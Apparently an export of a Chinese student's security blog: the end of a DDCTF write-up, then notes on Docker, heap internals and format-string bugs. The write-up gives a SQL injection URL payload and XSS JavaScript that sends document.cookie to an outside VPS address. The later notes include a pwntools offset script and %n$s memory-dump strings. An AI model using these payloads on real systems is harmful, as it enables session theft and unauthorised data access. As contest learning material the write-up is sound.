<p>payload:<br><a href="http://118.190.134.8/t1/news.php?id=7%0aunion%0aselect%0a*from%0a(select%0a1)a%0ajoin%0a(select%0a1)b%0ajoin%0a(select%0ai.4%0afrom%0a(select%0a*%0afrom%0a(select%0a1)e%0ajoin%0a(select%0a2)f%0ajoin%0a(select%0a3)g%0ajoin%0a(select%0a4)h%0aunion%0aselect%0a*%0afrom%0anews)i%0alimit%0a1%0aoffset%0a4)c%0ajoin%0a(select%0a1)d#" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=7%0aunion%0aselect%0a*from%0a(select%0a1)a%0ajoin%0a(select%0a1)b%0ajoin%0a(select%0ai.4%0afrom%0a(select%0a*%0afrom%0a(select%0a1)e%0ajoin%0a(select%0a2)f%0ajoin%0a(select%0a3)g%0ajoin%0a(select%0a4)h%0aunion%0aselect%0a*%0afrom%0anews)i%0alimit%0a1%0aoffset%0a4)c%0ajoin%0a(select%0a1)d#</a></p>
<p>flag:<br>flag{DDCTF-88458a95f96c4dfea359d1de2b03bbdb@didichuxing.com}</p>
<h2 id="几个资料不错"><a href="#几个资料不错" class="headerlink" title="几个资料不错"></a>几个资料不错</h2><p><a href="http://www.vuln.cn/6105" target="_blank" rel="external">http://www.vuln.cn/6105</a> (wooyun <a href="http://drops.wooyun.org/tips/7883" target="_blank" rel="external">http://drops.wooyun.org/tips/7883</a>)</p>
<h2 id="第七题-WEB-xss"><a href="#第七题-WEB-xss" class="headerlink" title="第七题[WEB,xss]"></a>第七题[WEB,xss]</h2><p>第一次做出来xss题目<br>这一题对xss没有任何过滤<br>但不能内联js，所以相当于利用上传</p>
<ol>
<li><p>先用link来bypass这个CSP</p>
<pre class="line-numbers language-html"><code class="language-html">// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prefetch<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//45.78.56.153:8886/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--
var n0t = document.createElement("link");
n0t.setAttribute("rel", "prefetch");
n0t.setAttribute("href", "http://45.78.56.153:8886/" + document.cookie);
document.head.appendChild(n0t);
// --></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在vps上收到了地址，等下作为脚本</p>
</li>
<li><p>再次上传并且引入第一步里的脚本</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash<span class="token punctuation">=</span>11b2054f2a3f28e43371b9008d66634d<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>获取tips<br><code>/hit=c2V0Y29va2llKCJmbGFnIiwgImZsYWd7eHh4eHh4eHh4eHh4eHh4eH0iLCB0aW1lKCkrMzYwMDAwMDAsICIvdDIvZjFhZ18xc19oM3IzIik7</code><br>base64一下</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"flag{xxxxxxxxxxxxxxxx}"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">36000000</span><span class="token punctuation">,</span> <span class="token string">"/t2/f1ag_1s_h3r3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>想要获取<code>/t2/f1ag_1s_h3r3</code>下的flag</p>
<pre class="line-numbers language-html"><code class="language-html">// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prefetch<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//45.78.56.153:8886/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--
var kk = document.getElementById('kk');
kk.onload = function () {
 var m = document.getElementById('kk').contentWindow;
 var n0t = document.createElement("link");
 n0t.setAttribute("rel", "prefetch");
 n0t.setAttribute("href", "http://45.78.56.153:8886/" + m.document.cookie);
 document.head.appendChild(n0t);
}
// --></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>vps上返回地址<br><a href="http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=b4bc243e8536536b0ff97e9d8acc7918" target="_blank" rel="external">http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=b4bc243e8536536b0ff97e9d8acc7918</a></p>
</li>
<li><p>这次引入一个iframe，通过第三步中的脚本来把cookie发到vps上</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash<span class="token punctuation">=</span>b4bc243e8536536b0ff97e9d8acc7918<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://114.215.24.14/t2/f1ag_1s_h3r3<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>kk<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>获得flag<br>flag{DDCTF-82b6ac5623b04c8f823d29fa73875c9c@didichuxing.com};</p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[docker笔记]]></title>
      <url>/2017/05/16/docker%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h3 id="起一个shell"><a href="#起一个shell" class="headerlink" title="起一个shell"></a>起一个shell</h3><pre class="line-numbers language-bash"><code class="language-bash">haibin$: <span class="token function">sudo</span> docker run -ti ubuntu:stack1  /bin/sh
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">haibin$: <span class="token function">sudo</span> docker images
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><pre class="line-numbers language-bash"><code class="language-bash">haibin$: <span class="token function">sudo</span> docker <span class="token function">ps</span> -a
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>contianer</code>和<code>images</code>是有很大不同的哦 (<a href="http://blog.csdn.net/chszs/article/details/48252799" target="_blank" rel="external">http://blog.csdn.net/chszs/article/details/48252799</a>)<br><code>-a</code>会显示所有的容器，不加<code>-a</code>只显示正在跑的<br>看起来好像是额，镜像是不可写的，相当于一块光盘镜像？然后容器可以更改？每次运行后的更改会写入容器的文件系统里<br>md虽然我还是不太懂，好忧伤啊</p>
<h3 id="从docker-container里拷贝libc文件出来"><a href="#从docker-container里拷贝libc文件出来" class="headerlink" title="从docker container里拷贝libc文件出来"></a>从docker container里拷贝libc文件出来</h3><pre class="line-numbers language-bash"><code class="language-bash">haibin$: <span class="token function">sudo</span> docker <span class="token function">cp</span> <span class="token operator">&lt;</span>containerId<span class="token operator">></span>:/lib32/libc.so.6 /host/path/target
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="检查特定容器"><a href="#检查特定容器" class="headerlink" title="检查特定容器"></a>检查特定容器</h3><pre class="line-numbers language-bash"><code class="language-bash">docker inspect contianerid
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="一般的run一个容器"><a href="#一般的run一个容器" class="headerlink" title="一般的run一个容器"></a>一般的run一个容器</h3><pre class="line-numbers language-bash"><code class="language-bash">haibin$: <span class="token function">sudo</span> docker run --name stack1 -it -d -P ubuntu:stack1
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre><code>-d 后台运行容器并返回容器ID
-it 交互式shell(那他这个-d之后再用-it有事吗意义吗)[查了下说`sudo docker attach contianerid` 可以重新起shell]
--name 起一个名字
-P 相当于端口映射，docker会在host中随机从49153 和65535之间查找一个未被占用的端口绑定到container
</code></pre><p>另外可以用<code>-p IP:host_port:container_port</code>指定端口映射规则(<a href="http://udn.yyuap.com/doc/docker_practice/advanced_network/port_mapping.html" target="_blank" rel="external">http://udn.yyuap.com/doc/docker_practice/advanced_network/port_mapping.html</a>)<br>然后发现个问题，我想做一些操作，把他attach出来，搞完后，我想把他退出去，然后我就<code>Ctrl+d</code>或者<code>exit</code>对吧<br>然后md，他就就退出去了，我的天哪<br>刚还发现:</p>
<blockquote>
<p>如果以单次执行方式运行容器，当命令执行完毕后容器就会自动停止。而使用交互的方式运行容器，则直到交互程序退出容器才会停止。<br>所以为了让他一直跑着，所以要<code>-it</code>，但不想看着他所以要丢到后台<code>-d</code>对吗<br>诶好像不是，这个<code>-d</code>是守护进程， </p>
</blockquote>
<p>查了下，可以酱紫</p>
<ol>
<li>在交互式容器中，先按<ctrl +="" p="">再按<ctrl +="" q="">，即可将容器切换到后台。这样子就能切回去了</ctrl></ctrl></li>
<li>还可以用<code>docker exec</code>来跑一个新的服务，或者起一个shell，用完把这个shell关掉就可以了</li>
</ol>
<h3 id="docker-exec"><a href="#docker-exec" class="headerlink" title="docker exec"></a>docker exec</h3><p>与docker run极为相似，也可以使用-i、-t和-d等参数<br>作用是为运行中的容器启动新进程<br>那就是说要先run一个，再有监控之类的需求的时候再exec一个进程</p>
<h3 id="镜像迁移"><a href="#镜像迁移" class="headerlink" title="镜像迁移"></a>镜像迁移</h3><p>备份</p>
<pre class="line-numbers language-bash"><code class="language-bash">haibin$: docker save busybox-1 <span class="token operator">></span> /home/save.tar
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>恢复</p>
<pre class="line-numbers language-bash"><code class="language-bash">haibin$: docker load <span class="token operator">&lt;</span> /home/save.tar
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有一次ctf的时候有道题目就是提供了一个docker镜像还是什么来着。自己直接没做</p>
<h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">haibin$: docker build -t <span class="token operator">&lt;</span>镜像名<span class="token operator">></span> <span class="token operator">&lt;</span>Dockerfile路径<span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.csdn.net/sch0120/article/category/6519600" target="_blank" rel="external">http://blog.csdn.net/sch0120/article/category/6519600</a><br>这个挺不错的，可以供参考的<br><a href="http://blog.csdn.net/chszs/article/details/48252799" target="_blank" rel="external">http://blog.csdn.net/chszs/article/details/48252799</a><br>这个还没细看<br><a href="http://blog.csdn.net/wsscy2004/article/details/25878363" target="_blank" rel="external">http://blog.csdn.net/wsscy2004/article/details/25878363</a><br>简单快速实用</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[动态链接]]></title>
      <url>/2017/05/16/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      <content type="html"><![CDATA[<h2 id="阅读理解"><a href="#阅读理解" class="headerlink" title="阅读理解"></a>阅读理解</h2><p><a href="http://www.iecc.com/linker/linker10.html" target="_blank" rel="external">http://www.iecc.com/linker/linker10.html</a><br><a href="http://blog.csdn.net/giantpoplar/article/details/46485649" target="_blank" rel="external">http://blog.csdn.net/giantpoplar/article/details/46485649</a></p>
<h2 id="还在理解中…"><a href="#还在理解中…" class="headerlink" title="还在理解中…"></a>还在理解中…</h2><p>动态装入静态链接<br>静态装入动态链接<br>动态装入动态链接<br>静态装入静态链接</p>
<p>hhh~没懂，要买本程序员的自我修养了</p>
<p>好菜啊，I’m good vegetable</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[堆溢出]]></title>
      <url>/2017/05/16/%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      <content type="html"><![CDATA[<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> malloc_chunk <span class="token punctuation">{</span>
  INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Size of previous chunk (if free).  */</span>
  INTERNAL_SIZE_T      size<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* Size in bytes, including overhead. */</span>

  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>
  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk<span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">/* Only used for large blocks: pointer to next larger size.  */</span>
  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>
  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span>

<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>未释放(分配)的堆块只使用<code>prev_size</code>和<code>size</code><br>已经释放的堆块还会使用<code>fd</code>和<code>bk</code>字段，作为<code>漏洞利用字段</code></p>
<p>所以我们可以画个图</p>
<blockquote>
<p>使用中的堆</p>
<pre><code>+-----+-----+
|prev_size  |
+-----------+
|size    | p|
+-----+-----+
|chunk(data)|
+-----+-----+
</code></pre><p>free掉的堆</p>
</blockquote>
<pre><code>+--------+--------+
|prev_size        |
+-----------------+
|size    |    p   |
+--------+--------+
|fd(next)|bk(prev)|
+--------+--------+
|chunk(data)      |
+--------+--------+
</code></pre><p>在glibc堆块中是8字节对齐的。为了简化内存的管理，堆块的大小总是8字节的倍数。这就表示size的最后3位可以是其他用途（正常情况下总是置0）。只有第一位对我们很重要(我们把后三位叫做p,那么这个很重要的就是p的最低位了)。如果这位置1，就表示前面的堆块在使用。如果没有置1，表示 <em>前面</em> 的堆块没有被使用。如果相关的内存被释放了，堆块就不会被使用（通过调用函数去释放）。</p>
<p>这个<br>注意是前面的堆块<br>所以要知道本堆块是否在使用，需要顺着指针找到下一堆块，看下一堆块size的标志位(不是prev_size)</p>
<p><code>prev_size</code> 表示前一个chunk的size, 那么可以使用这个值来找到前一个chunk的开始</p>
<blockquote>
<p>我有一个问题,这个前后是怎么分的…什么叫前,什么叫后</p>
</blockquote>
<p>当前堆块释放后，下一堆块的size字段关键位会被清零。此外，prev_size字段会被设置为堆块释放状态(但好像是当p=0,这个prev_size才有意义)</p>
<p>被释放的堆块通过<code>fd</code>和<code>bk</code>连入一个双向链表中(据说还是一个环形的，首尾相接的链表,是的,这个在<code>0day安全里看到了</code>)<br>大概长这个样子,这个表win下他叫空表[FreeList],0day安全里面这样子叫他(下面来自win)</p>
<h3 id="这部分内容切到Windows"><a href="#这部分内容切到Windows" class="headerlink" title="这部分内容切到Windows"></a>这部分内容切到Windows</h3><pre><code>Free|0]   -&gt; ... 这个Free[0]比较特殊,连了介于1~512KB的空闲堆块,大小升序连接
Free|0]   &lt;- ... 其他的连接的堆块连接的堆块大小为`Index * 8` byte

Free|1]   -&gt; [8    ] -&gt; [8    ]  -&gt; [8    ] -&gt; [8    ] -&gt; Free[1]开头
Free|1]   &lt;- [bytes] &lt;- [bytes]  &lt;- [bytes] &lt;- [bytes] &lt;- 来自Free[1]开头
...
Free|127] -&gt; [1016 ] -&gt; [1016 ] -&gt; [1016 ] -&gt; [1016 ] -&gt; Free[127]开头
Free|127] &lt;- [bytes] &lt;- [bytes] &lt;- [bytes] &lt;- [bytes] &lt;- 来自Free[127]开头
</code></pre><p>同时提到<code>快表</code><br>这是windows为了加快堆的分配而采用的一种堆表,这类单向链表不会发生堆合并(其中空闲块块首被设置为占用)<br>也是有128条,只是其中的堆块采用单链表组织,其他和普通空表类似</p>
<p>对于堆块的分配,对于大小不同的块,有不同分配方式</p>
<ul>
<li>小块: 快表分配 -&gt; 普通空表分配 -&gt; 堆缓存(我也不知道这个是啥)分配 -&gt; 零号空表分配 -&gt; NULL</li>
<li>大块: 堆缓存 -&gt; 零号空表分配</li>
<li><p>巨块: 虚分配</p>
</li>
<li><p>堆块大小Size是包含块首在内的,如果我们请求32字节,则实际会分配32+8(块首大小)字节,但空表里的大小应该是data的大小,不包含表头</p>
</li>
<li>堆块的单位是8字节,不足8字节按照8字节分配</li>
<li><p>初始状态下,快表空表都为空,不能精确分配,所以使用次优块(好像有的地方叫尾块,有的地方叫顶块)</p>
</li>
<li><p>快表只会精确匹配,快表每一条只允许有4项</p>
</li>
<li>快表单恋,比较快,所以分配和释放优先用快表</li>
</ul>
<p>都是书上看来的,我没有windows,暂时也不能试验</p>
<blockquote>
<p>那么如果我的快表里只有4个16字节的块,然而我的空表里也只有16字节的,那么我需要8字节的时候,是要切割普通空表里的这个16字节的块嘛,还是顶块分配</p>
</blockquote>
<h2 id="欢迎切换回来到linux"><a href="#欢迎切换回来到linux" class="headerlink" title="欢迎切换回来到linux"></a>欢迎切换回来到linux</h2><p>上面的是说windows的情况,现在回到Linux里glibc的<code>ptmalloc</code><br>然后在网上找到资料</p>
<h3 id="下面来自资料"><a href="#下面来自资料" class="headerlink" title="下面来自资料"></a>下面来自资料</h3><h4 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h4><blockquote>
<p>ptmalloc 将 heap 中<code>相似大小</code>的 chunk 用双向链表链接起来, 这样的一个链表被称为一个bin. ptmalloc 共维护了128个bin, 并使用一个数组来存储这些 bin<br>但,不太一样的地方在这里</p>
</blockquote>
<p>前64个bin叫做<code>exact bins</code>, 每一个 bin 分别包含了相同大小的chunk<br>后面的bin叫做<code>ordered bins</code>,每一个 bin 分别包含了一个给定范围内的chunk</p>
<h4 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h4><p>一般的情况是, 程序在运行时会经常需要分配和释放一些较小的内存空间. 当 allocator 合并了相邻的几个小的 chunk 之后, 也许马上就会有另一个小块内存的请求, 这样 allocator 又需要从大的空闲内存中分出一块出来, 这样无疑是比较低效的,所以就有了不合并的<code>fastbins</code>(就是win里面的<code>快表</code>)</p>
<p>不大于 max_fast (72 bytes) 的 chunk 被 free 后, 首先会被放到 fastbins 中, fastbins 中的 chunk 并不改变它的使用标志p. 这样也就无法将它们合并, 当需要给用户分配的 chunk 小于或等于 max_fast 时, ptmalloc 首先会在 fastbins 中查找相应的空闲块(具体的分配算法请参考第7节), 然后才会去查找 bins 中的空间 chunk. 在某个特定的时候, ptmalloc 会遍历 fastbins 中的 chunk, 将相邻的空闲 chunk 进行合并, 并将合并后的 chunk 放到 bins 中去.</p>
<h4 id="unsorted-bins"><a href="#unsorted-bins" class="headerlink" title="unsorted bins"></a>unsorted bins</h4><p>如果被用户释放的 chunk 大于 max_fast, 则按上面的叙述它应该会被放到 bins中. 但实际上, ptmalloc 还引入了一个称为 “unsorted bins”的队列. 这些大于 max_fast 的chunk 首先会被放到 “unsorted bins” 队列中, 在进行 malloc 操作的时候, 如果在 fastbins 中没有找到合适的 chunk, 则 ptmalloc 会先在 “unsorted bins”中查找合适的空闲 chunk, 然后才查找 bins. 如果 “unsorted bins” 不能满足分配要求. malloc 便会将 “unsorted bins” 中的 chunk 放到 bins 中, 然后再在 bins 中继续进行查找和分配过程. 从这个过程可以看出来, “unsorted bins”可以看做是 bins 的一个缓冲区, 增加它只是为了加快分配的速度(就是上面windows部分提到的<code>堆缓存</code>)</p>
<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>在前面一直提到, ptmalloc 会预先分配一块较大的空闲内存(也就是所为的 heap), 而通过管理这块内存来响应用户的需求, 因为内存是按地址从低向高进行分配的, 在空闲内存的最高处, 必然存在着一块空闲 chunk, 叫做 “top chunk”. 当 bins 和 fastbins 都不能满足分配需要的时候, ptmalloc 会设法在 “top chunk” 中分出一块内存给用户, 如果 “top chunk” 本身不够大, 则 ptmalloc 会适当的增加它的大小(也就增加了 heap 的大小). 以满足分配的需要, 实际上, “top chunk” 在分配时总是在 ‘fastbins 和 bins 之后被考虑, 所以, 不论 “top chunk” 有多大, 它都不会被放到 fastbins 或者是 bins 中. (应该就是上面windows提到的<code>尾块</code>)</p>
<h4 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h4><p>当需要分配的 chunk 足够大, 而且 fastbins 和 bins 都不能满足要求, 甚至 “top chunk” 本身也不能满足分配需求时, ptmalloc 会使用 mmap 来直接使用内存映射来将页映射到进程空间(具体的情况, 请参考第6节). 这样分配的 chunk 在被 free 时将直接解除映射, 于是就将内存归还给了系统, 再次对这样的内存区的引用将导致一个 “segmentation fault” 错误. 这样的 chunk 也不会包含在任何 bin 中.(应该就是上面提到的巨块的<code>虚分配</code>)</p>
<h4 id="分配主要靠brk和mmap"><a href="#分配主要靠brk和mmap" class="headerlink" title="分配主要靠brk和mmap"></a>分配主要靠brk和mmap</h4><p>资料上具体过程写的有点乱,再找吧</p>
<p>当申请内存时，首先从具有相同大小的已经释放的堆块（或者大一点的堆块,言外之意就是可以切割稍大一点的空闲堆块）中查找并重新使用这段内存。仅仅当没有找到合适的堆块时才会使用顶块。</p>
<blockquote>
<p>当一个堆块释放了（通过调用free函数），它会检查之前的堆块是否被释放了。如果之前的堆块没有在使用，那么就会和当前的堆块合并。这样就会增加堆块的大小。结果就是这个堆块需要被放置在不同的链表中。这样的话，之前释放的堆块就需要首先从原来的空闲链表中删除(执行unlink操作),这个时候会改变bk,fd指针,就是利用的时候，接着再和当前堆块合并到另一个合适的链表中。从一个链表中删除一个堆块的代码如下：</p>
</blockquote>
<p>这个前后大概是说<code>在空间上chunk和chunk相邻的关系吧</code>,这个和链表中的前后关系无关</p>
<p>据说这是老版本glic里的<code>unlink</code></p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">unlink</span><span class="token punctuation">(</span>malloc_chunk <span class="token operator">*</span> P<span class="token punctuation">,</span> malloc_chunk <span class="token operator">*</span> BK<span class="token punctuation">,</span> malloc_chunk <span class="token operator">*</span> FD<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    FD <span class="token operator">=</span> P <span class="token operator">-></span> fd<span class="token punctuation">;</span>
    BK <span class="token operator">=</span> P <span class="token operator">-></span> bk<span class="token punctuation">;</span>
    FD <span class="token operator">-></span> bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>
    BK <span class="token operator">-></span> fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="学习中"><a href="#学习中" class="headerlink" title="学习中"></a>学习中</h2><p>我的天，并没有学会TAT</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="external">http://www.tuicool.com/articles/E3Ezu2u</a> (包含了老版本的unlink和新版的)<br><a href="http://blog.csdn.net/heiyeshuwu/article/details/27325719" target="_blank" rel="external">http://blog.csdn.net/heiyeshuwu/article/details/27325719</a><br><a href="http://www.ms509.com/?p=49" target="_blank" rel="external">http://www.ms509.com/?p=49</a> (后来看到的)<br><a href="http://www.cnblogs.com/0xJDchen/category/885258.html" target="_blank" rel="external">http://www.cnblogs.com/0xJDchen/category/885258.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[再瞎说几句就回宿舍]]></title>
      <url>/2017/05/11/%E5%86%8D%E7%9E%8E%E8%AF%B4%E5%87%A0%E5%8F%A5%E5%B0%B1%E5%9B%9E%E5%AE%BF%E8%88%8D/</url>
      <content type="html"><![CDATA[<p>自己早不知道干啥去了,,,真是惨</p>
<p>想买一本<code>0day安全</code>再买一本<code>加密解密</code>，还有一本<code>程序员的自我修养</code></p>
<p>看超级厉害的某bendawang师傅的博客</p>
<p>感觉简直厉害到爆==，超级服气</p>
<p>什么时候能像他那样子</p>
]]></content>
      
        <categories>
            
            <category> 日记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[printf]]></title>
      <url>/2017/05/11/printf/</url>
      <content type="html"><![CDATA[<p>天真的以为printf和其他普通的函数差不多，后来看格式化字符串漏洞的时候发现好像不太一样的</p>
<h2 id="someting"><a href="#someting" class="headerlink" title="someting"></a>someting</h2><p>当前的$ebp 处存的实际上是原来的$ebp<br>即用<code>x/wx $ebp</code>就能拿到caller的<code>$ebp</code>，喔，好像很显然对吧</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> c </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[格式化字符串漏洞]]></title>
      <url>/2017/05/11/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h2 id="先看看能干什么"><a href="#先看看能干什么" class="headerlink" title="先看看能干什么"></a>先看看能干什么</h2><p>能用来绕过canary(2333 厉害了)</p>
<h2 id="怎么用"><a href="#怎么用" class="headerlink" title="怎么用"></a>怎么用</h2><p>还没学会</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>看了找个师傅的觉得写的不错<br>链接 <a href="http://0x48.pw/2017/03/13/0x2c/" target="_blank" rel="external">http://0x48.pw/2017/03/13/0x2c/</a></p>
<p>根据文章说格式化字符串漏洞的作用就是读写内存(wc, 好强啊)</p>
<p>提到通过<code>%x</code>这样子来测试是不是存在漏洞</p>
<p>没有源码的pwn就需要格式化字符串漏洞把bin给dump下来(这算不算blind)</p>
<p>不过好像有种<code>blind rop</code>好像和这个不太一样的诶</p>
<blockquote>
<p>格式化字符串漏洞是怎么产生的？首先要有一个函数，比如read, 比如gets获取用户输入的数据储存到局部变量中，然后直接把该变量作为printf这类函数的第一个参数值</p>
</blockquote>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

<span class="token keyword">def</span> <span class="token function">exec_fmt</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"a.out"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    info <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> info

autofmt <span class="token operator">=</span> FmtStr<span class="token punctuation">(</span>exec_fmt<span class="token punctuation">)</span>
<span class="token keyword">print</span> autofmt<span class="token punctuation">.</span>offset
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的FmtStr是pwn自带的，可以用它算出offset</p>
<blockquote>
<p>在Linux下，不开PIE保护时，32位的ELF的默认首地址为0x8048000，如果开启了PIE保护，则需要根据ELF的魔术头7f 45 4c 46进行爆破，内存地址一页一页的往前翻直到翻到ELF的魔术头为止</p>
</blockquote>
<p>另外要注意<code>\x00</code>的终止(截断)问题</p>
<p>利用<br>形如<code>%12$s</code> =&gt; 会显示第十二个参数所指的地址处的值 即为<code>Value(addr(arg[11]))</code><br>形如<code>%12$x</code> =&gt; 会显示第十二个参数的十六进制值 即为<code>Value(arg[11])</code><br>不知道理解对不对<br>所以在找offset的时候应该使用<code>%12$x</code> 比如<code>ABCD%11$x</code>看看能不能得到<code>ABCD44434241</code><br>而在找到offset后，要dump原始的bin的时候要使用<code>%12$s</code>比如<code>&quot;%13$saaa&quot; + p32(0x8048000)</code></p>
<p>dump 数据(读内存)</p>
